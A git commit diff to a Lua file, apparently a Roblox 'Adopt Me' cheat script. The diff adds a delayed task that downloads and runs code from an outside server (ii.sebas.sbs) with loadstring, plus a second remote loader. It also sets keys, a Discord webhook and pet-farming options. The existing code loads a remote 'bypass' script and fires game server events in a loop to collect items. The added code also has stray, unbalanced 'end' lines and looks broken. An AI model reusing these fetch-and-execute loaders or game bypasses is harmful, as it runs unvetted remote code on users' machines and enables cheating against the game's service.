2fef9c969fac414f15b20b5ec248b29ef9c5a355
greg66n <darien95sm@hotmail.com>
2025-02-02 17:27:27 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,3 +1,24 @@
+task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+-- ARCEUS, CODEX ETC
+script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
+getgenv().Config = {
+    ["PetFarmAutoSwitchFullGrown"] = false,
+    ["PetFarmActive"] = true,
+    ["EggFarmActive"] = false,
+    ["Blur_username"] = false,
+    ["Blazing_Lion_Log"] = false,
+    ["DiscordId"] = "942321951010086922",
+    ["Webhook"] = "https://discord.com/api/webhooks/123456",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
+    -- add other scripts here
+end) -- add other scripts here
+end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
 wait(1)
@@ -36,6 +57,7 @@ for i = 1, 100 do
     args[2] = tostring(i)
     game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
     wait(0.2)  -- Delay of 0.2 seconds
+end
 end
 wait(1)
 local args = {
